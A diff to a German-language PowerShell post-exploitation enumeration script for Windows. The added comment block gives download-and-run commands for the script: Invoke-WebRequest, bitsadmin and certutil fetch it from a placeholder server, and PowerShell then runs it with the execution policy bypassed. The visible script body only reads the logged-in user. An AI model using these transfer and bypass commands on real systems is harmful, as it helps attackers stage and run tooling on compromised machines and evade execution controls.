@@ -1,5 +1,13 @@
 # Windows Enum-Skript für die Post-Exploitation
 
+
+# Invoke-WebRequest -Uri "http://dein-server/enum_script.ps1" -OutFile "C:\enum_script.ps1"
+# bitsadmin /transfer "DownloadJob" http://dein-server/enum_script.ps1 C:\enum_script.ps1
+# certutil -urlcache -split -f "http://dein-server/enum_script.ps1" C:\enum_script.ps1
+# powershell.exe -ExecutionPolicy Bypass -File C:\enum_script.ps1
+#
+#
+
 # Anmeldung auf lokalem System überprüfen
 $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
 Write-Host "Angemeldeter Benutzer: $($currentUser.Name)"
